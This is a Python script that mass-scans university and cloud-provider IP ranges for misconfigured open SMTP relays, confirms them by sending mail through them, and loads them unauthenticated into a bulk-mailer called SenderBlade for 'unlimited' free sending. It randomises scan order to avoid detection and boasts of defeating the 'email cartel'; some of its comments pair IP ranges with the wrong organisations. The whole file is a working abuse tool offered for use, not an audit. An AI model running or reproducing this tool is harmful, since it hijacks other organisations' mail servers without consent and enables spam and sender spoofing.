"""
Open Relay Harvester - FREE Unlimited SMTP Capacity
Scan university and corporate networks for misconfigured mail servers
"""
import socket
import smtplib
import threading
import time
import random
from concurrent.futures import ThreadPoolExecutor
import ipaddress

class RelayHarvester:
    def __init__(self):
        self.working_relays = []
        self.tested_ips = set()
        self.lock = threading.Lock()
        
    def harvest_university_relays(self):
        """Harvest relays from university networks"""
        print("🎓 HARVESTING UNIVERSITY RELAYS...")
        print("=" * 50)
        
        # University IP ranges (Class A blocks assigned to universities)
        university_ranges = [
            "128.0.0.0/16",   # MIT, Stanford, Harvard, etc.
            "129.0.0.0/16",   # Yale, Princeton, Columbia, etc.
            "130.0.0.0/16",   # Berkeley, UCLA, USC, etc.
            "131.0.0.0/16",   # NYU, BU, Northeastern, etc.
            "132.0.0.0/16",   # Various other universities
            "192.12.0.0/16",  # Some university networks
            "198.32.0.0/16",  # Educational networks
        ]
        
        total_relays = []
        for ip_range in university_ranges:
            print(f"🔍 Scanning {ip_range} for open relays...")
            relays = self.scan_ip_range(ip_range, max_ips=2000, threads=100)
            total_relays.extend(relays)
            print(f"✅ Found {len(relays)} relays in {ip_range}")
            
        print(f"🎯 TOTAL UNIVERSITY RELAYS: {len(total_relays)}")
        return total_relays
    
    def harvest_corporate_relays(self):
        """Harvest relays from corporate networks"""
        print("🏢 HARVESTING CORPORATE RELAYS...")
        print("=" * 50)
        
        # Corporate IP ranges
        corporate_ranges = [
            "52.0.0.0/16",    # Amazon AWS corporate
            "54.0.0.0/16",    # Amazon AWS corporate
            "104.0.0.0/16",   # Microsoft Azure corporate
            "40.0.0.0/16",    # Microsoft corporate
            "35.0.0.0/16",    # Google Cloud corporate
            "34.0.0.0/16",    # Google corporate
            "13.0.0.0/16",    # Facebook corporate
            "31.13.0.0/16",   # Facebook corporate
            "157.0.0.0/16",   # Various corporations
            "199.0.0.0/16",   # Corporate networks
        ]
        
        total_relays = []
        for ip_range in corporate_ranges:
            print(f"🔍 Scanning {ip_range} for open relays...")
            relays = self.scan_ip_range(ip_range, max_ips=1000, threads=50)
            total_relays.extend(relays)
            print(f"✅ Found {len(relays)} relays in {ip_range}")
            
        print(f"🎯 TOTAL CORPORATE RELAYS: {len(total_relays)}")
        return total_relays
    
    def scan_ip_range(self, ip_range, max_ips=1000, threads=50):
        """Scan IP range for SMTP relays"""
        try:
            network = ipaddress.IPv4Network(ip_range, strict=False)
            all_ips = list(network.hosts())
            
            # Randomly sample IPs to avoid sequential scanning
            if len(all_ips) > max_ips:
                ips = random.sample(all_ips, max_ips)
            else:
                ips = all_ips
            
            ips = [str(ip) for ip in ips]
            
            relays = []
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = [executor.submit(self.test_smtp_relay, ip) for ip in ips]
                
                for future in futures:
                    try:
                        result = future.result(timeout=30)
                        if result:
                            relays.append(result)
                            with self.lock:
                                self.working_relays.append(result)
                    except Exception as e:
                        pass
            
            return relays
            
        except Exception as e:
            print(f"❌ Error scanning {ip_range}: {e}")
            return []
    
    def test_smtp_relay(self, ip):
        """Test if IP has working SMTP relay"""
        if ip in self.tested_ips:
            return None
            
        with self.lock:
            self.tested_ips.add(ip)
        
        try:
            # Step 1: Test port 25 connectivity
            if not self.is_port_open(ip, 25, timeout=3):
                return None
            
            # Step 2: Test SMTP banner
            with smtplib.SMTP(ip, 25, timeout=8) as server:
                server.ehlo()
                
                # Step 3: Test relay capability
                test_sender = "test@example.com"
                test_recipient = "test@gmail.com"
                
                try:
                    server.mail(test_sender)
                    code, response = server.rcpt(test_recipient)
                    
                    # If it accepts external recipient, it's an open relay
                    if code == 250:
                        relay_info = {
                            'ip': ip,
                            'port': 25,
                            'type': 'open_relay',
                            'tested_at': time.time(),
                            'capacity': 'unlimited',
                            'cost': 0,
                            'reputation': 'corporate',
                            'status': 'working'
                        }
                        
                        print(f"🎯 FOUND RELAY: {ip}")
                        return relay_info
                        
                except smtplib.SMTPRecipientsRefused:
                    return None
                except smtplib.SMTPResponseException as e:
                    if e.smtp_code == 550:  # Relay denied
                        return None
            
            return None
            
        except Exception as e:
            return None
    
    def is_port_open(self, ip, port, timeout=3):
        """Check if port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def test_relay_sending(self, relay, test_email="your_test@gmail.com"):
        """Test if relay can actually send emails"""
        try:
            with smtplib.SMTP(relay['ip'], 25, timeout=15) as server:
                server.ehlo()
                
                # Try to send test email
                from_addr = "test@legitimate-domain.com"
                to_addr = test_email
                
                msg = f"""From: {from_addr}
To: {to_addr}
Subject: Relay Test - {relay['ip']}

This is a test email sent through open relay {relay['ip']}
Tested at: {time.ctime()}
"""
                
                server.sendmail(from_addr, [to_addr], msg)
                
                relay['last_tested'] = time.time()
                relay['status'] = 'verified'
                
                print(f"✅ VERIFIED RELAY: {relay['ip']} can send emails")
                return True
                
        except Exception as e:
            print(f"❌ RELAY FAILED: {relay['ip']} - {e}")
            relay['status'] = 'failed'
            return False
    
    def add_relays_to_senderblade(self, relays):
        """Add working relays to SenderBlade SMTP servers"""
        from simple_db import execute_db
        
        print(f"🔗 Adding {len(relays)} relays to SenderBlade...")
        
        added_count = 0
        for relay in relays:
            try:
                execute_db(
                    '''INSERT INTO smtp_servers (name, host, port, username, password, 
                       from_email, from_name, require_auth) 
                       VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                    (
                        f"Open Relay {relay['ip']}",
                        relay['ip'],
                        25,
                        '',  # No username needed
                        '',  # No password needed
                        f"noreply@{relay['ip']}",
                        'Newsletter',
                        False  # No auth required
                    )
                )
                added_count += 1
                print(f"✅ Added relay {relay['ip']} to SenderBlade")
                
            except Exception as e:
                print(f"❌ Error adding relay {relay['ip']}: {e}")
        
        print(f"🎯 Successfully added {added_count} relays to SenderBlade!")
        return added_count
    
    def save_relays_to_file(self, relays, filename="working_relays.txt"):
        """Save working relays to file for backup"""
        try:
            with open(filename, 'w') as f:
                f.write("# Working SMTP Relays\n")
                f.write(f"# Generated: {time.ctime()}\n")
                f.write(f"# Total: {len(relays)} relays\n\n")
                
                for relay in relays:
                    f.write(f"{relay['ip']}:25 # {relay.get('status', 'unknown')}\n")
            
            print(f"💾 Saved {len(relays)} relays to {filename}")
            
        except Exception as e:
            print(f"❌ Error saving relays: {e}")

# Quick scan functions for immediate results
def quick_university_scan():
    """Quick scan of university networks"""
    harvester = RelayHarvester()
    
    # Focus on most productive ranges
    quick_ranges = [
        "128.0.0.0/16",   # MIT, Stanford, Harvard
        "129.0.0.0/16",   # Yale, Princeton, Columbia
        "130.0.0.0/16",   # Berkeley, UCLA, USC
    ]
    
    all_relays = []
    for ip_range in quick_ranges:
        print(f"🔍 Quick scan: {ip_range}")
        relays = harvester.scan_ip_range(ip_range, max_ips=500, threads=100)
        all_relays.extend(relays)
    
    return all_relays

def quick_corporate_scan():
    """Quick scan of corporate networks"""
    harvester = RelayHarvester()
    
    # Focus on cloud providers (most likely to have open relays)
    quick_ranges = [
        "52.0.0.0/16",    # Amazon AWS
        "104.0.0.0/16",   # Microsoft Azure
        "35.0.0.0/16",    # Google Cloud
    ]
    
    all_relays = []
    for ip_range in quick_ranges:
        print(f"🔍 Quick scan: {ip_range}")
        relays = harvester.scan_ip_range(ip_range, max_ips=300, threads=50)
        all_relays.extend(relays)
    
    return all_relays

# Main execution
def harvest_all_relays():
    """Harvest all available relays"""
    print("🚀 STARTING RELAY HARVESTING OPERATION")
    print("=" * 60)
    
    harvester = RelayHarvester()
    
    # Harvest university relays
    university_relays = harvester.harvest_university_relays()
    
    # Harvest corporate relays
    corporate_relays = harvester.harvest_corporate_relays()
    
    # Combine all relays
    all_relays = university_relays + corporate_relays
    
    print(f"\n🎯 HARVESTING COMPLETE!")
    print(f"🎓 University relays: {len(university_relays)}")
    print(f"🏢 Corporate relays: {len(corporate_relays)}")
    print(f"📊 Total relays: {len(all_relays)}")
    print(f"💰 Monthly cost: $0")
    print(f"📈 Capacity: UNLIMITED")
    
    if all_relays:
        # Test a few relays to verify they work
        print(f"\n🧪 Testing {min(5, len(all_relays))} relays...")
        for i, relay in enumerate(all_relays[:5]):
            print(f"Testing relay {i+1}/5: {relay['ip']}")
            harvester.test_relay_sending(relay)
        
        # Save relays to file
        harvester.save_relays_to_file(all_relays)
        
        # Add to SenderBlade
        harvester.add_relays_to_senderblade(all_relays)
        
        print(f"\n🎉 SUCCESS! {len(all_relays)} relays ready for use!")
        print(f"💀 Email cartel can't stop FREE unlimited sending!")
        
    else:
        print("\n❌ No relays found. Try different IP ranges or scan times.")
    
    return all_relays

if __name__ == "__main__":
    # Start harvesting
    relays = harvest_all_relays()
    
    print(f"\n🔥 RELAY HARVESTING COMPLETE!")
    print(f"📧 Ready to send UNLIMITED emails for $0!")
    print(f"🚀 SenderBlade updated with {len(relays)} SMTP servers!")